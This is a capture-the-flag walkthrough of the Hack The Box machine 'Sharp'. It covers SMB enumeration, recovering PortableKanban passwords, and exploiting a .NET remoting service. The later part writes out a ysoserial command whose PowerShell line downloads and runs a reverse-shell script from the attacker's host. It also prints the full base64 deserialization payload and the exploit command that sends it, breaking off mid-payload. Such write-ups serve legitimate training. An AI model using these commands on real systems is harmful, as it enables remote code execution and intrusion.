--- 
published: true
title: Hackthebox Sharp walkthrough
date: 2021-11-26 03:50:00 +0200
categories: [HTB]
tags: HTB
---

<img src="https://i.ibb.co/47wNjmZ/Eo-Ud-Yp-BWMAwn3-Z2.jpg" alt="Eo-Ud-Yp-BWMAwn3-Z2">

<h1>Methodology</h1>
<h3>1- Scanning</h3>
<h3>2- SMB Enumertion</h3>
<h3>3- Kanban Analysis</h3>
<h3>4- Config Manipulation</h3>
<h3>5- Exploit Remote Service</h3>
<h3>6- WCF Exploitation</h3>



<h1>Scanning</h1>

<pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.219</span></span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">135/tcp  open  tcpwrapped</span><br><span class="line">139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">5985/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">8888/tcp open  sun-answerbook?</span><br><span class="line">8889/tcp open  ddi-tcp-2?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre>

<h1>SMB Enumeration</h1>

<p>When you see SMB in Windows enviroment you should go for it !</p>
<p>Let's start enumerating</p>

<h1>SMB Enumeration</h1>

<pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.219</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     NO ACCESS</span><br><span class="line">        IPC$                                                    NO ACCESS       Remote IPC</span><br><span class="line">        kanban                                                  READ ONLY</span><br></pre>


<p>It looks like that we can read Kanban directory only, so let's see what we can get</p>

<pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -H 10.10.10.219 -R</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     NO ACCESS</span><br><span class="line">        IPC$                                                    NO ACCESS       Remote IPC</span><br><span class="line">        kanban                                                  READ ONLY</span><br><span class="line">        .\kanban\*</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    .</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    ..</span><br><span class="line">        fr--r--r--            58368 Sat Nov 14 13:57:04 2020    CommandLine.dll</span><br><span class="line">        fr--r--r--           141312 Sat Nov 14 13:57:04 2020    CsvHelper.dll</span><br><span class="line">        fr--r--r--           456704 Sat Nov 14 13:57:04 2020    DotNetZip.dll</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:59 2020    Files</span><br><span class="line">        fr--r--r--            23040 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Converter.Html.dll</span><br><span class="line">        fr--r--r--            75776 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Interpreter.dll</span><br><span class="line">        fr--r--r--            32768 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Parser.dll</span><br><span class="line">        fr--r--r--            19968 Sat Nov 14 13:57:04 2020    Itenso.Sys.dll</span><br><span class="line">        fr--r--r--           376832 Sat Nov 14 13:57:04 2020    MsgReader.dll</span><br><span class="line">        fr--r--r--           133296 Sat Nov 14 13:57:04 2020    Ookii.Dialogs.dll</span><br><span class="line">        fr--r--r--          2558011 Sat Nov 14 13:57:04 2020    pkb.zip</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    Plugins</span><br><span class="line">        fr--r--r--             5819 Sat Nov 14 13:57:04 2020    PortableKanban.cfg</span><br><span class="line">        fr--r--r--           118184 Sat Nov 14 13:57:04 2020    PortableKanban.Data.dll</span><br><span class="line">        fr--r--r--          1878440 Sat Nov 14 13:57:04 2020    PortableKanban.exe</span><br><span class="line">        fr--r--r--            31144 Sat Nov 14 13:57:04 2020    PortableKanban.Extensions.dll</span><br><span class="line">        fr--r--r--             2080 Sat Nov 14 13:57:04 2020    PortableKanban.pk3</span><br><span class="line">        fr--r--r--             2080 Sat Nov 14 13:57:04 2020    PortableKanban.pk3.bak</span><br><span class="line">        fr--r--r--               34 Sat Nov 14 13:57:04 2020    PortableKanban.pk3.md5</span><br><span class="line">        fr--r--r--           413184 Sat Nov 14 13:57:04 2020    ServiceStack.Common.dll</span><br><span class="line">        fr--r--r--           137216 Sat Nov 14 13:57:04 2020    ServiceStack.Interfaces.dll</span><br><span class="line">        fr--r--r--           292352 Sat Nov 14 13:57:04 2020    ServiceStack.Redis.dll</span><br><span class="line">        fr--r--r--           411648 Sat Nov 14 13:57:04 2020    ServiceStack.Text.dll</span><br><span class="line">        fr--r--r--          1050092 Sat Nov 14 13:57:04 2020    User Guide.pdf</span><br><span class="line">        .\kanban\Plugins\*</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    .</span><br><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    ..</span><br></pre>

<p>We need now to get the files on our machine to analyze it to see if we can get any useful information</p>

<pre><span class="line">smbget -R smb://10.10.10.219/kanban</span><br></pre>

<h1>Kanban Analysis</h1>

<p>After downloading all the files in Kanban directory, I used ack to search for passwords in the files</p>

<pre><span class="line">apt-get install ack</span><br><span class="line"></span><br><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br><span class="line">└─<span class="comment"># ack -i "password"</span></span><br><span class="line">PortableKanban.pk3</span><br><span class="line">1:{<span class="string">"Columns"</span>:[{<span class="string">"Id"</span>:<span class="string">"4757781032fd41b2a4511822e2c08850"</span>,<span class="string">"SortOrder"</span>:0,<span class="string">"Name"</span>:<span class="string">"Demo"</span>,<span class="string">"Limit"</span>:0,<span class="string">"TaskOrder"</span>:{<span class="string">"SortType"</span>:<span class="string">"None"</span>,<span class="string">"Parameters"</span>:[{<span class="string">"Field"</span>:<span class="string">"Completed"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Descending"</span>},{<span class="string">"Field"</span>:<span class="string">"Deadline"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Ascending"</span>},{<span class="string">"Field"</span>:<span class="string">"Priority"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Descending"</span>},{<span class="string">"Field"</span>:<span class="string">"Topic"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Ascending"</span>},{<span class="string">"Field"</span>:<span class="string">"Person"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Ascending"</span>}]},<span class="string">"AutoComplete"</span>:<span class="literal">false</span>,<span class="string">"ResetCompleted"</span>:<span class="literal">false</span>,<span class="string">"TimeStamp"</span>:637409769443121006}],<span class="string">"Tasks"</span>:[{<span class="string">"Id"</span>:<span class="string">"33870d6dfe4146718ba0b2c9f7bc05cf"</span>,<span class="string">"SeriesId"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"SortOrder"</span>:<span class="string">"oGdBKcFw"</span>,<span class="string">"ColumnId"</span>:<span class="string">"4757781032fd41b2a4511822e2c08850"</span>,<span class="string">"TopicId"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"PersonId"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"Text"</span>:<span class="string">"New Task"</span>,<span class="string">"Priority"</span>:<span class="string">"Low"</span>,<span class="string">"Created"</span>:<span class="string">"\/Date(1605380100000+0100)\/"</span>,<span class="string">"CreatedBy"</span>:<span class="string">"e8e29158d70d44b1a1ba4949d52790a0"</span>,<span class="string">"Modified"</span>:<span class="string">"\/Date(-62135596800000)\/"</span>,<span class="string">"ModifiedBy"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"Deadline"</span>:<span class="string">"\/Date(1605308400000+0100)\/"</span>,<span class="string">"HasDeadline"</span>:<span class="literal">false</span>,<span class="string">"Completed"</span>:<span class="string">"\/Date(1605308400000+0100)\/"</span>,<span class="string">"CompletedBy"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"Done"</span>:<span class="literal">false</span>,<span class="string">"Canceled"</span>:<span class="literal">false</span>,<span class="string">"Link"</span>:<span class="string">""</span>,<span class="string">"Subtasks"</span>:[],<span class="string">"Tags"</span>:[],<span class="string">"Estimate"</span>:0,<span class="string">"Progress"</span>:0,<span class="string">"Points"</span>:0,<span class="string">"Comments"</span>:[],<span class="string">"CustomFields"</span>:{},<span class="string">"TimeStamp"</span>:637409769542424146}],<span class="string">"TimeTracks"</span>:[],<span class="string">"Persons"</span>:[],<span class="string">"Topics"</span>:[],<span class="string">"Tags"</span>:[],<span class="string">"Views"</span>:[],<span class="string">"Users"</span>:[{<span class="string">"Id"</span>:<span class="string">"e8e29158d70d44b1a1ba4949d52790a0"</span>,<span class="string">"Name"</span>:<span class="string">"Administrator"</span>,<span class="string">"Initials"</span>:<span class="string">""</span>,<span class="string">"Email"</span>:<span class="string">""</span>,<span class="string">"EncryptedPassword"</span>:<span class="string">"k+iUoOvQYG98PuhhRC7/rg=="</span>,<span class="string">"Role"</span>:<span class="string">"Admin"</span>,<span class="string">"Inactive"</span>:<span class="literal">false</span>,<span class="string">"TimeStamp"</span>:637409769245503731},{<span class="string">"Id"</span>:<span class="string">"0628ae1de5234b81ae65c246dd2b4a21"</span>,<span class="string">"Name"</span>:<span class="string">"lars"</span>,<span class="string">"Initials"</span>:<span class="string">""</span>,<span class="string">"Email"</span>:<span class="string">""</span>,<span class="string">"EncryptedPassword"</span>:<span class="string">"Ua3LyPFM175GN8D3+tqwLA=="</span>,<span class="string">"Role"</span>:<span class="string">"User"</span>,<span class="string">"Inactive"</span>:<span class="literal">false</span>,<span class="string">"TimeStamp"</span>:637409769265925613}],<span class="string">"ServiceMessages"</span>:[],<span class="string">"CustomFieldDescriptors"</span>:[],<span class="string">"MetaData"</span>:{<span class="string">"Id"</span>:<span class="string">"ffffffffffffffffffffffffffffffff"</span>,<span class="string">"SchemaVersion"</span>:<span class="string">"4.2.0.0"</span>,<span class="string">"SchemaVersionModified"</span>:<span class="string">"\/Date(1605380100000+0100)\/"</span>,<span class="string">"SchemaVersionModifiedBy"</span>:<span class="string">"e8e29158d70d44b1a1ba4949d52790a0"</span>,<span class="string">"SchemaVersionChecked"</span>:<span class="string">"\/Date(-62135596800000-0000)\/"</span>,<span class="string">"SchemaVersionCheckedBy"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"TimeStamp"</span>:637409769001918463}}</span><br></pre>


<p>Ack found creds in PortableKanban.pk3</p>

<pre><span class="line">Administrator</span><br><span class="line">ID: e8e29158d70d44b1a1ba4949d52790a0</span><br><span class="line">Encrypted Password: <span class="string">"k+iUoOvQYG98PuhhRC7/rg=="</span></span><br><span class="line"></span><br><span class="line">Lars</span><br><span class="line">ID: 0628ae1de5234b81ae65c246dd2b4a21</span><br><span class="line">Encrypted Password: <span class="string">"Ua3LyPFM175GN8D3+tqwLA=="</span></span><br></pre>


<p>I needed to read Kanban user guide to know how the porgram works</p>

<p>Page 1: The program is portable so we can edit the config but it will be our responsibility if something happened</p>
<p>Page 3: Password can be blank but you shouldn't use it like that </p>
<p>Page 11: Administrator is the default account and the password is blank </p>
<p>Page 18: If your forgot the password take executable file to another directorty and run it as admin </p>
<p>Page 22: Passwords in setup/users tab</p>

<p>After reading the guide, now to need to run the exe file on another directory to restore the passwords </p>

<p>From now you should use windows VM, In my case iam using dual boot so i countinued with windows</p>

<p>When i ran it as admin it says that the files has been successfully recoverd</p>

<p>So i tried to sign in as administrator since it's the default user and that's the only user we know</p>

<img src="https://i.ibb.co/p0DLhCf/htb139.jpg" alt="htb139" border="0">

<h1>Config Manipulation</h1>

<p>I can't log in, So since it's a portable software let's take a look at the configuration</p>

<img src="https://i.ibb.co/3STVZxd/htb140.jpg" alt="htb140" border="0">

<p>It's looks like when the application load it takes an encrypted password for the administrator</p>
<p>As i mentioned earlier we can use a blank password, So now let's remove the password and try to log in</p>

<img src="https://i.ibb.co/ggf8S9c/htb141.jpg" alt="htb141" border="0">

<p>BAM ! we logged in</p>

<img src="https://i.ibb.co/Tgcbvnc/htb142.jpg" alt="htb142" border="0">

<p>Now let's go to Setup/users tab to get the passwords</p>

<img src="https://i.ibb.co/BfYFmVT/htb143.jpg" alt="htb143" border="0">

<p>You need to uncheck the hide password box to get it</p>

<p>So we got Lars:G123HHrth234gRG</p>

<pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     READ ONLY</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        kanban                                                  NO ACCESS</span><br></pre>

<p>As you see we have permissions on another 2 directories, Let's list all the files</p>

<pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br><span class="line">└─<span class="comment"># smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219 -R</span></span><br><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        dev                                                     READ ONLY</span><br><span class="line">        .\dev\*</span><br><span class="line">        dr--r--r--                0 Sun Nov 15 06:30:13 2020    .</span><br><span class="line">        dr--r--r--                0 Sun Nov 15 06:30:13 2020    ..</span><br><span class="line">        fr--r--r--             5632 Sun Nov 15 05:25:01 2020    Client.exe</span><br><span class="line">        fr--r--r--               70 Sun Nov 15 08:59:02 2020    notes.txt</span><br><span class="line">        fr--r--r--             4096 Sun Nov 15 05:25:01 2020    RemotingLibrary.dll</span><br><span class="line">        fr--r--r--             6144 Mon Nov 16 06:55:44 2020    Server.exe</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        .\IPC$\*</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-364-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1e4-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-190-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-428-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-254-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-274-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132546763363573536.2940.DefaultAppDomain.wsmprovhost</span><br><span class="line">        kanban                                                  NO ACCESS</span><br></pre>

<p>That's a lot of files, let's get download them on our machine</p>

<pre><span class="line">smbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRG</span><br></pre>

<h1>Exploit Remote Service</h1>

<p>We have now to exe files so we need to De-Compile them and analyze them</p>
<p>I used Dnspy https://github.com/dnSpy/dnSpy</p>

<p>So i opened Client.exe</p>

<img src="https://i.ibb.co/0G0vGdj/2021-05-01-21-43-58.png" alt="2021-05-01-21-43-58" border="0">

<p>You can see RemoteSample right ?, Let's see what it contains.</p>
<img src="https://i.ibb.co/WPf3BSz/2021-05-01-21-44-29.png" alt="2021-05-01-21-44-29" border="0">

<p>It's connecting to port 8888 and there's creds as you can see</p>
<img src="https://i.ibb.co/k0G1Qdv/2021-05-01-21-44-56.png" alt="2021-05-01-21-44-56" border="0">

<h1>User</h1>

<p>I searched for .NET remote service exploit and found : <a href="https://github.com/tyranid/ExploitRemotingService">ExploitRemotingService</a></p>

<h1>Creating the reverse shell on Windows</h1>

<p>1- Download python for windows to start HTTP server to host the reverse shell file</p>
<p>2- Download compiled Nc.exe to get the reverse shell connection</p>
<p>3- Use nishang reverse shell and add this line [Invoke-PowerShellTcp -Reverse -IPAddress [Your IP] -Port [Your listner port]] at the end of the file to download our hosted reverse shell file</p>
<p>4- Download Ysoserial to serialize our payload to bypass windows defender</p>


<pre><span class="line">ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c <span class="string">"powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.x.x/Invoke-PowerShellTcp.ps1')"</span></span><br></pre>

<p>After serializing</p>

<pre><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL</span><br></pre>

<p>Now we need to use the exploit we found and use the seralized payload</p>

<pre><span class="line">ExploitRemotingService.exe -s --user=debug --pass=<span class="string">"SharpApplicationDebugUserPassword123!"</span> tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJ